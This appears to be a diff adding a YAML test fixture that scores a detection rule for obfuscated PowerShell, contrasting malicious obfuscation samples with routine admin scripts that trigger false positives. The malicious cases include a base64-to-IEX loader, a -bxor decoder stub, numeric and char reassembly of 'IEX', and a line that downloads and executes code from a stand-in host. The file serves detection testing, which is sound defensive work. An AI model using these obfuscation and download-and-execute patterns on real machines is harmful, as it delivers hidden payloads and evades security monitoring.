@@ -1,0 +1,100 @@
+description: >
+  Obfuscated PowerShell in ScriptBlock logging (EID 4104). The rule matches any
+  of FromBase64String, -bxor, [char[, char], -join, [Convert]::ToInt.
+
+  Several of those tokens are ordinary PowerShell. -join and [Convert]::ToInt in
+  particular appear in perfectly normal administrative scripts, so the benign set
+  is full of code a sysadmin would write on any given Tuesday. This rule is
+  expected to score badly, and that is the point of measuring it.
+cases:
+  - name: invoke_obfuscation_base64
+    label: malicious
+    why: base64 decode chained into IEX — the standard obfuscated loader
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('SQBFAFgAIAAo')))
+      Path: ""
+
+  - name: xor_decoder_stub
+    label: malicious
+    why: -bxor loop reconstructing a payload byte by byte
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $k=0x41;$d=$e|%{$_ -bxor $k};IEX([char[]]$d -join '')
+      Path: ""
+
+  - name: char_array_reassembly
+    label: malicious
+    why: char-code reassembly to hide a cmdlet name from string matching
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $c=[char[]](73,69,88);$s=$c -join '';&$s ((New-Object Net.WebClient).DownloadString('http://198.51.100.20/a'))
+      Path: ""
+
+  - name: convert_toint_obfuscation
+    label: malicious
+    why: numeric reassembly via [Convert]::ToInt32 to evade signatures
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $b=@('49','45','58')|%{[char][Convert]::ToInt32($_,10)};IEX ($b -join '')
+      Path: ""
+
+  - name: admin_joins_path_segments
+    label: benign
+    why: >-
+      -join used to build a path. Completely routine, and it fires. The single
+      most likely false positive this rule will generate in production.
+    event:
+      EventID: 4104
+      ScriptBlockText: $path = @($root, 'logs', $date) -join '\'
+      Path: C:\Scripts\rotate-logs.ps1
+
+  - name: report_script_formats_csv
+    label: benign
+    why: -join building a CSV row in a reporting script; fires
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $line = ($user.Name, $user.Department, $user.Enabled) -join ','; Add-Content $out $line
+      Path: C:\Scripts\user-report.ps1
+
+  - name: parse_config_integer
+    label: benign
+    why: >-
+      [Convert]::ToInt32 parsing a config value — ordinary type conversion, and
+      it fires
+    event:
+      EventID: 4104
+      ScriptBlockText: $timeout = [Convert]::ToInt32($config.TimeoutSeconds)
+      Path: C:\Scripts\deploy.ps1
+
+  - name: legitimate_base64_certificate
+    label: benign
+    why: >-
+      FromBase64String decoding a certificate in a real PKI script. Fires, and is
+      genuinely hard to separate from the malicious use without more context.
+    event:
+      EventID: 4104
+      ScriptBlockText: >-
+        $raw = [System.Convert]::FromBase64String($pem); $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$raw)
+      Path: C:\Scripts\install-cert.ps1
+
+  - name: plain_service_check
+    label: benign
+    why: ordinary administrative PowerShell containing none of the tokens — a true negative
+    event:
+      EventID: 4104
+      ScriptBlockText: Get-Service -Name Spooler | Where-Object { $_.Status -ne 'Running' } | Start-Service
+      Path: C:\Scripts\healthcheck.ps1
+
+  - name: inventory_query
+    label: benign
+    why: a second clean administrative script, to keep the true-negative side honest
+    event:
+      EventID: 4104
+      ScriptBlockText: Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace
+      Path: C:\Scripts\inventory.ps1
